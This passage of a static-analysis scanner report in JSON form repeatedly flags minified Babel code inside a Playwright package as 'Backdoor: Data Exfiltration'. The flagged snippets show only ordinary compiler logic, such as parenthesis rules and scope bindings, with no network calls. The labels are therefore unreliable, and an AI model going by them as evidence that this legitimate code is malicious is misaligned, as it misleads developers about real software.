                    "text": "&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e=e.expression);let s=(n=QX.get(e.type))==null?void 0:n(e,t);return typeof s==\"number\"?(s&r)!==0:!1}function ZX(e,t){return xm(e,t,1)}function eJ(e,t){return xm(e,t,2)}function tJ(e,t,r){var n;return t?JX(t)&&t.callee===e&&YS(e)?!0:(n=zX.get(e.type))==null?void 0:n(e,t,r):!1}});var XS=E(lo=>{\"use strict\";Object.defineProperty(lo,\"__esModule\",{value:!0});lo.TaggedTemplateExpression=rJ;lo.TemplateElement=nJ;lo.TemplateLiteral=sJ;function rJ(e){this.print(e.tag,e),this.print(e.typeParameters,e),this.print(e.quasi,e)}function nJ(e,t){let r=",
                    "rendered": {
                      "text": "&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e=e.expression);let s=(n=QX.get(e.type))==null?void 0:n(e,t);return typeof s==\"number\"?(s&r)!==0:!1}function ZX(e,t){return xm(e,t,1)}function eJ(e,t){return xm(e,t,2)}function tJ(e,t,r){var n;return t?JX(t)&&t.callee===e&&YS(e)?!0:(n=zX.get(e.type))==null?void 0:n(e,t,r):!1}});var XS=E(lo=>{\"use strict\";Object.defineProperty(lo,\"__esModule\",{value:!0});lo.TaggedTemplateExpression=rJ;lo.TemplateElement=nJ;lo.TemplateLiteral=sJ;function rJ(e){this.print(e.tag,e),this.print(e.typeParameters,e),this.print(e.quasi,e)}function nJ(e,t){let r=",
                      "markdown": "`&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e=e.expression);let s=(n=QX.get(e.type))==null?void 0:n(e,t);return typeof s==\"number\"?(s&r)!==0:!1}function ZX(e,t){return xm(e,t,1)}function eJ(e,t){return xm(e,t,2)}function tJ(e,t,r){var n;return t?JX(t)&&t.callee===e&&YS(e)?!0:(n=zX.get(e.type))==null?void 0:n(e,t,r):!1}});var XS=E(lo=>{\"use strict\";Object.defineProperty(lo,\"__esModule\",{value:!0});lo.TaggedTemplateExpression=rJ;lo.TemplateElement=nJ;lo.TemplateLiteral=sJ;function rJ(e){this.print(e.tag,e),this.print(e.typeParameters,e),this.print(e.quasi,e)}function nJ(e,t){let r=`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 10333,
                  "endLine": 14,
                  "endColumn": 10338,
                  "snippet": {
                    "text": "l){var u;return(u=i(a,o,l))!=null?u:s(a,o,l)}:s)}for(let n of Object.keys(e)){let s=GX[n];if(s)for(let i of s)r(i,e[n]);else r(n,e[n])}return t}var zX=HS(WX),QX=HS($X.nodes);function YS(e){return HX(e)?!0:XX(e)&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e=e.expression);let s=(n=QX.get(e.type))==null?void 0:n(e,t);return typeof s==\"number\"?(s&r)!==0:!1}function ZX(e,t){return xm(e,t,1)}function eJ(e,t){return xm(e,t,2)}function tJ(e,t,r){var n;return t?JX(t)&&t.callee===e&&YS(e)?!0:(n=zX.get(e.type))==null?void 0:n(e,t,r):!1}});var XS=E(lo=>{\"use strict\";Object.defineProperty(lo,\"",
                    "rendered": {
                      "text": "l){var u;return(u=i(a,o,l))!=null?u:s(a,o,l)}:s)}for(let n of Object.keys(e)){let s=GX[n];if(s)for(let i of s)r(i,e[n]);else r(n,e[n])}return t}var zX=HS(WX),QX=HS($X.nodes);function YS(e){return HX(e)?!0:XX(e)&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e=e.expression);let s=(n=QX.get(e.type))==null?void 0:n(e,t);return typeof s==\"number\"?(s&r)!==0:!1}function ZX(e,t){return xm(e,t,1)}function eJ(e,t){return xm(e,t,2)}function tJ(e,t,r){var n;return t?JX(t)&&t.callee===e&&YS(e)?!0:(n=zX.get(e.type))==null?void 0:n(e,t,r):!1}});var XS=E(lo=>{\"use strict\";Object.defineProperty(lo,\"",
                      "markdown": "`l){var u;return(u=i(a,o,l))!=null?u:s(a,o,l)}:s)}for(let n of Object.keys(e)){let s=GX[n];if(s)for(let i of s)r(i,e[n]);else r(n,e[n])}return t}var zX=HS(WX),QX=HS($X.nodes);function YS(e){return HX(e)?!0:XX(e)&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e=e.expression);let s=(n=QX.get(e.type))==null?void 0:n(e,t);return typeof s==\"number\"?(s&r)!==0:!1}function ZX(e,t){return xm(e,t,1)}function eJ(e,t){return xm(e,t,2)}function tJ(e,t,r){var n;return t?JX(t)&&t.callee===e&&YS(e)?!0:(n=zX.get(e.type))==null?void 0:n(e,t,r):!1}});var XS=E(lo=>{\"use strict\";Object.defineProperty(lo,\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 10002,
                  "endLine": 14,
                  "endColumn": 10007,
                  "snippet": {
                    "text": "{value:!0});Vi.needsParens=tJ;Vi.needsWhitespace=xm;Vi.needsWhitespaceAfter=eJ;Vi.needsWhitespaceBefore=ZX;var $X=US(),WX=GS(),KX=De(),{FLIPPED_ALIAS_KEYS:GX,isCallExpression:HX,isExpressionStatement:YX,isMemberExpression:XX,isNewExpression:JX}=KX;function HS(e){let t=new Map;function r(n,s){let i=t.get(n);t.set(n,i?function(a,o,l){var u;return(u=i(a,o,l))!=null?u:s(a,o,l)}:s)}for(let n of Object.keys(e)){let s=GX[n];if(s)for(let i of s)r(i,e[n]);else r(n,e[n])}return t}var zX=HS(WX),QX=HS($X.nodes);function YS(e){return HX(e)?!0:XX(e)&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e",
                    "rendered": {
                      "text": "{value:!0});Vi.needsParens=tJ;Vi.needsWhitespace=xm;Vi.needsWhitespaceAfter=eJ;Vi.needsWhitespaceBefore=ZX;var $X=US(),WX=GS(),KX=De(),{FLIPPED_ALIAS_KEYS:GX,isCallExpression:HX,isExpressionStatement:YX,isMemberExpression:XX,isNewExpression:JX}=KX;function HS(e){let t=new Map;function r(n,s){let i=t.get(n);t.set(n,i?function(a,o,l){var u;return(u=i(a,o,l))!=null?u:s(a,o,l)}:s)}for(let n of Object.keys(e)){let s=GX[n];if(s)for(let i of s)r(i,e[n]);else r(n,e[n])}return t}var zX=HS(WX),QX=HS($X.nodes);function YS(e){return HX(e)?!0:XX(e)&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e",
                      "markdown": "`{value:!0});Vi.needsParens=tJ;Vi.needsWhitespace=xm;Vi.needsWhitespaceAfter=eJ;Vi.needsWhitespaceBefore=ZX;var $X=US(),WX=GS(),KX=De(),{FLIPPED_ALIAS_KEYS:GX,isCallExpression:HX,isExpressionStatement:YX,isMemberExpression:XX,isNewExpression:JX}=KX;function HS(e){let t=new Map;function r(n,s){let i=t.get(n);t.set(n,i?function(a,o,l){var u;return(u=i(a,o,l))!=null?u:s(a,o,l)}:s)}for(let n of Object.keys(e)){let s=GX[n];if(s)for(let i of s)r(i,e[n]);else r(n,e[n])}return t}var zX=HS(WX),QX=HS($X.nodes);function YS(e){return HX(e)?!0:XX(e)&&YS(e.object)}function xm(e,t,r){var n;if(!e)return!1;YX(e)&&(e`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 6465,
                  "endLine": 14,
                  "endColumn": 6470,
                  "snippet": {
                    "text": "c&&oo(r,1)}function CX(e,t){let r=t.type;if(e.operator===\"**\"&&r===\"BinaryExpression\"&&t.operator===\"**\")return t.left===e;if(xu(e,t)||ao(e,t)||r===\"UnaryExpression\"||r===\"SpreadElement\"||r===\"AwaitExpression\")return!0;if(r===\"BinaryExpression\"||r===\"LogicalExpression\"){let n=VS.get(t.operator),s=VS.get(e.operator);if(n===s&&t.right===e&&r!==\"LogicalExpression\"||n>s)return!0}}function wX(e,t){let r=t.type;return r===\"ArrayTypeAnnotation\"||r===\"NullableTypeAnnotation\"||r===\"IntersectionTypeAnnotation\"||r===\"UnionTypeAnnotation\"}function DX(e,t){return gX(t)&&t.objectType===e}function IX(){return!0}f",
                    "rendered": {
                      "text": "c&&oo(r,1)}function CX(e,t){let r=t.type;if(e.operator===\"**\"&&r===\"BinaryExpression\"&&t.operator===\"**\")return t.left===e;if(xu(e,t)||ao(e,t)||r===\"UnaryExpression\"||r===\"SpreadElement\"||r===\"AwaitExpression\")return!0;if(r===\"BinaryExpression\"||r===\"LogicalExpression\"){let n=VS.get(t.operator),s=VS.get(e.operator);if(n===s&&t.right===e&&r!==\"LogicalExpression\"||n>s)return!0}}function wX(e,t){let r=t.type;return r===\"ArrayTypeAnnotation\"||r===\"NullableTypeAnnotation\"||r===\"IntersectionTypeAnnotation\"||r===\"UnionTypeAnnotation\"}function DX(e,t){return gX(t)&&t.objectType===e}function IX(){return!0}f",
                      "markdown": "`c&&oo(r,1)}function CX(e,t){let r=t.type;if(e.operator===\"**\"&&r===\"BinaryExpression\"&&t.operator===\"**\")return t.left===e;if(xu(e,t)||ao(e,t)||r===\"UnaryExpression\"||r===\"SpreadElement\"||r===\"AwaitExpression\")return!0;if(r===\"BinaryExpression\"||r===\"LogicalExpression\"){let n=VS.get(t.operator),s=VS.get(e.operator);if(n===s&&t.right===e&&r!==\"LogicalExpression\"||n>s)return!0}}function wX(e,t){let r=t.type;return r===\"ArrayTypeAnnotation\"||r===\"NullableTypeAnnotation\"||r===\"IntersectionTypeAnnotation\"||r===\"UnionTypeAnnotation\"}function DX(e,t){return gX(t)&&t.objectType===e}function IX(){return!0}f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 6444,
                  "endLine": 14,
                  "endColumn": 6449,
                  "snippet": {
                    "text": "(e,t,r){return!e.async&&oo(r,1)}function CX(e,t){let r=t.type;if(e.operator===\"**\"&&r===\"BinaryExpression\"&&t.operator===\"**\")return t.left===e;if(xu(e,t)||ao(e,t)||r===\"UnaryExpression\"||r===\"SpreadElement\"||r===\"AwaitExpression\")return!0;if(r===\"BinaryExpression\"||r===\"LogicalExpression\"){let n=VS.get(t.operator),s=VS.get(e.operator);if(n===s&&t.right===e&&r!==\"LogicalExpression\"||n>s)return!0}}function wX(e,t){let r=t.type;return r===\"ArrayTypeAnnotation\"||r===\"NullableTypeAnnotation\"||r===\"IntersectionTypeAnnotation\"||r===\"UnionTypeAnnotation\"}function DX(e,t){return gX(t)&&t.objectType===e}fun",
                    "rendered": {
                      "text": "(e,t,r){return!e.async&&oo(r,1)}function CX(e,t){let r=t.type;if(e.operator===\"**\"&&r===\"BinaryExpression\"&&t.operator===\"**\")return t.left===e;if(xu(e,t)||ao(e,t)||r===\"UnaryExpression\"||r===\"SpreadElement\"||r===\"AwaitExpression\")return!0;if(r===\"BinaryExpression\"||r===\"LogicalExpression\"){let n=VS.get(t.operator),s=VS.get(e.operator);if(n===s&&t.right===e&&r!==\"LogicalExpression\"||n>s)return!0}}function wX(e,t){let r=t.type;return r===\"ArrayTypeAnnotation\"||r===\"NullableTypeAnnotation\"||r===\"IntersectionTypeAnnotation\"||r===\"UnionTypeAnnotation\"}function DX(e,t){return gX(t)&&t.objectType===e}fun",
                      "markdown": "`(e,t,r){return!e.async&&oo(r,1)}function CX(e,t){let r=t.type;if(e.operator===\"**\"&&r===\"BinaryExpression\"&&t.operator===\"**\")return t.left===e;if(xu(e,t)||ao(e,t)||r===\"UnaryExpression\"||r===\"SpreadElement\"||r===\"AwaitExpression\")return!0;if(r===\"BinaryExpression\"||r===\"LogicalExpression\"){let n=VS.get(t.operator),s=VS.get(e.operator);if(n===s&&t.right===e&&r!==\"LogicalExpression\"||n>s)return!0}}function wX(e,t){let r=t.type;return r===\"ArrayTypeAnnotation\"||r===\"NullableTypeAnnotation\"||r===\"IntersectionTypeAnnotation\"||r===\"UnionTypeAnnotation\"}function DX(e,t){return gX(t)&&t.objectType===e}fun`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 61857,
                  "endLine": 12,
                  "endColumn": 61862,
                  "snippet": {
                    "text": "++}_popQueue(){if(this._queueCursor===0)throw new Error(\"Cannot pop from empty queue\");return this._queue[--this._queueCursor]}get(){this._flush();let t=this._map,r={code:(this._buf+this._str).trimRight(),decodedMap:t==null?void 0:t.getDecoded(),get __mergedMap(){return this.map},get map(){let n=t?t.get():null;return r.map=n,n},set map(n){Object.defineProperty(r,\"map\",{value:n,writable:!0})},get rawMappings(){let n=t==null?void 0:t.getRawMappings();return r.rawMappings=n,n},set rawMappings(n){Object.defineProperty(r,\"rawMappings\",{value:n,writable:!0})}};return r}append(t,r){this._flush(),this._app",
                    "rendered": {
                      "text": "++}_popQueue(){if(this._queueCursor===0)throw new Error(\"Cannot pop from empty queue\");return this._queue[--this._queueCursor]}get(){this._flush();let t=this._map,r={code:(this._buf+this._str).trimRight(),decodedMap:t==null?void 0:t.getDecoded(),get __mergedMap(){return this.map},get map(){let n=t?t.get():null;return r.map=n,n},set map(n){Object.defineProperty(r,\"map\",{value:n,writable:!0})},get rawMappings(){let n=t==null?void 0:t.getRawMappings();return r.rawMappings=n,n},set rawMappings(n){Object.defineProperty(r,\"rawMappings\",{value:n,writable:!0})}};return r}append(t,r){this._flush(),this._app",
                      "markdown": "`++}_popQueue(){if(this._queueCursor===0)throw new Error(\"Cannot pop from empty queue\");return this._queue[--this._queueCursor]}get(){this._flush();let t=this._map,r={code:(this._buf+this._str).trimRight(),decodedMap:t==null?void 0:t.getDecoded(),get __mergedMap(){return this.map},get map(){let n=t?t.get():null;return r.map=n,n},set map(n){Object.defineProperty(r,\"map\",{value:n,writable:!0})},get rawMappings(){let n=t==null?void 0:t.getRawMappings();return r.rawMappings=n,n},set rawMappings(n){Object.defineProperty(r,\"rawMappings\",{value:n,writable:!0})}};return r}append(t,r){this._flush(),this._app`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 40710,
                  "endLine": 12,
                  "endColumn": 40715,
                  "snippet": {
                    "text": "r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParent(){let t=this;do if(t.path.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockPar",
                    "rendered": {
                      "text": "r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParent(){let t=this;do if(t.path.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockPar",
                      "markdown": "`r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParent(){let t=this;do if(t.path.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockPar`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 40447,
                  "endLine": 12,
                  "endColumn": 40452,
                  "snippet": {
                    "text": "let\")&&r.isFunction()&&!r.node.name&&SS(r.parent,{callee:r.node})&&r.parent.arguments.length<=r.node.params.length&&Qs(a)){r.pushContainer(\"params\",a),r.scope.registerBinding(\"param\",r.get(\"params\")[r.node.params.length-1]);return}(r.isLoop()||r.isCatchClause()||r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParen",
                    "rendered": {
                      "text": "let\")&&r.isFunction()&&!r.node.name&&SS(r.parent,{callee:r.node})&&r.parent.arguments.length<=r.node.params.length&&Qs(a)){r.pushContainer(\"params\",a),r.scope.registerBinding(\"param\",r.get(\"params\")[r.node.params.length-1]);return}(r.isLoop()||r.isCatchClause()||r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParen",
                      "markdown": "`let\")&&r.isFunction()&&!r.node.name&&SS(r.parent,{callee:r.node})&&r.parent.arguments.length<=r.node.params.length&&Qs(a)){r.pushContainer(\"params\",a),r.scope.registerBinding(\"param\",r.get(\"params\")[r.node.params.length-1]);return}(r.isLoop()||r.isCatchClause()||r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParen`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 40331,
                  "endLine": 12,
                  "endColumn": 40336,
                  "snippet": {
                    "text": "nctionParent()||this.getProgramParent()).path);let{init:n,unique:s,kind:i=\"var\",id:a}=t;if(!n&&!s&&(i===\"var\"||i===\"let\")&&r.isFunction()&&!r.node.name&&SS(r.parent,{callee:r.node})&&r.parent.arguments.length<=r.node.params.length&&Qs(a)){r.pushContainer(\"params\",a),r.scope.registerBinding(\"param\",r.get(\"params\")[r.node.params.length-1]);return}(r.isLoop()||r.isCatchClause()||r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,",
                    "rendered": {
                      "text": "nctionParent()||this.getProgramParent()).path);let{init:n,unique:s,kind:i=\"var\",id:a}=t;if(!n&&!s&&(i===\"var\"||i===\"let\")&&r.isFunction()&&!r.node.name&&SS(r.parent,{callee:r.node})&&r.parent.arguments.length<=r.node.params.length&&Qs(a)){r.pushContainer(\"params\",a),r.scope.registerBinding(\"param\",r.get(\"params\")[r.node.params.length-1]);return}(r.isLoop()||r.isCatchClause()||r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,",
                      "markdown": "`nctionParent()||this.getProgramParent()).path);let{init:n,unique:s,kind:i=\"var\",id:a}=t;if(!n&&!s&&(i===\"var\"||i===\"let\")&&r.isFunction()&&!r.node.name&&SS(r.parent,{callee:r.node})&&r.parent.arguments.length<=r.node.params.length&&Qs(a)){r.pushContainer(\"params\",a),r.scope.registerBinding(\"param\",r.get(\"params\")[r.node.params.length-1]);return}(r.isLoop()||r.isCatchClause()||r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 36742,
                  "endLine": 12,
                  "endColumn": 36747,
                  "snippet": {
                    "text": "inding(\"unknown\",t)}buildUndefinedNode(){return QY()}registerConstantViolation(t){let r=t.getBindingIdentifiers();for(let s of Object.keys(r)){var n;(n=this.getBinding(s))==null||n.reassign(t)}}registerBinding(t,r,n=r){if(!t)throw new ReferenceError(\"no `kind`\");if(r.isVariableDeclaration()){let a=r.get(\"declarations\");for(let o of a)this.registerBinding(t,o);return}let s=this.getProgramParent(),i=r.getOuterBindingIdentifiers(!0);for(let a of Object.keys(i)){s.references[a]=!0;for(let o of i[a]){let l=this.getOwnBinding(a);if(l){if(l.identifier===o)continue;this.checkBlockScopedCollisions(l,t,a,o)}",
                    "rendered": {
                      "text": "inding(\"unknown\",t)}buildUndefinedNode(){return QY()}registerConstantViolation(t){let r=t.getBindingIdentifiers();for(let s of Object.keys(r)){var n;(n=this.getBinding(s))==null||n.reassign(t)}}registerBinding(t,r,n=r){if(!t)throw new ReferenceError(\"no `kind`\");if(r.isVariableDeclaration()){let a=r.get(\"declarations\");for(let o of a)this.registerBinding(t,o);return}let s=this.getProgramParent(),i=r.getOuterBindingIdentifiers(!0);for(let a of Object.keys(i)){s.references[a]=!0;for(let o of i[a]){let l=this.getOwnBinding(a);if(l){if(l.identifier===o)continue;this.checkBlockScopedCollisions(l,t,a,o)}",
                      "markdown": "`inding(\"unknown\",t)}buildUndefinedNode(){return QY()}registerConstantViolation(t){let r=t.getBindingIdentifiers();for(let s of Object.keys(r)){var n;(n=this.getBinding(s))==null||n.reassign(t)}}registerBinding(t,r,n=r){if(!t)throw new ReferenceError(\"no `kind`\");if(r.isVariableDeclaration()){let a=r.get(\"declarations\");for(let o of a)this.registerBinding(t,o);return}let s=this.getProgramParent(),i=r.getOuterBindingIdentifiers(!0);for(let a of Object.keys(i)){s.references[a]=!0;for(let o of i[a]){let l=this.getOwnBinding(a);if(l){if(l.identifier===o)continue;this.checkBlockScopedCollisions(l,t,a,o)}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 36295,
                  "endLine": 12,
                  "endColumn": 36300,
                  "snippet": {
                    "text": "sImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.get(\"specifiers\");for(let s of n){let i=r||s.isImportSpecifier()&&(s.node.importKind===\"type\"||s.node.importKind===\"typeof\");this.registerBinding(i?\"unknown\":\"module\",s)}}else if(t.isExportDeclaration()){let r=t.get(\"declaration\");(r.isClassDeclaration()||r.isFunctionDeclaration()||r.isVariableDeclaration())&&this.registerDeclaration(r)}else this.registerBinding(\"unknown\",t)}buildUndefinedNode(){return QY()}registerConstantViolation(t){let r=t.getBindingIdentifiers();for(let s of Object.keys(r)){var n;(n=this.g",
                    "rendered": {
                      "text": "sImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.get(\"specifiers\");for(let s of n){let i=r||s.isImportSpecifier()&&(s.node.importKind===\"type\"||s.node.importKind===\"typeof\");this.registerBinding(i?\"unknown\":\"module\",s)}}else if(t.isExportDeclaration()){let r=t.get(\"declaration\");(r.isClassDeclaration()||r.isFunctionDeclaration()||r.isVariableDeclaration())&&this.registerDeclaration(r)}else this.registerBinding(\"unknown\",t)}buildUndefinedNode(){return QY()}registerConstantViolation(t){let r=t.getBindingIdentifiers();for(let s of Object.keys(r)){var n;(n=this.g",
                      "markdown": "`sImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.get(\"specifiers\");for(let s of n){let i=r||s.isImportSpecifier()&&(s.node.importKind===\"type\"||s.node.importKind===\"typeof\");this.registerBinding(i?\"unknown\":\"module\",s)}}else if(t.isExportDeclaration()){let r=t.get(\"declaration\");(r.isClassDeclaration()||r.isFunctionDeclaration()||r.isVariableDeclaration())&&this.registerDeclaration(r)}else this.registerBinding(\"unknown\",t)}buildUndefinedNode(){return QY()}registerConstantViolation(t){let r=t.getBindingIdentifiers();for(let s of Object.keys(r)){var n;(n=this.g`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 36083,
                  "endLine": 12,
                  "endColumn": 36088,
                  "snippet": {
